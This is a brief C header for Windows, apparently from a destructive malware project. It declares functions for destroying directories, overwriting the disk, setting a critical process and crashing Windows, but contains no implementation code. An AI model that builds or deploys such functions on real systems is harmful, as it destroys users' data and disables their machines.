#pragma once

#include <Windows.h>
#include <AclAPI.h>

extern void DestroyDirectory(LPWSTR Directory);
extern void OverWriteDisk();
extern void SetCriticalProcess();
extern void CrashWindows();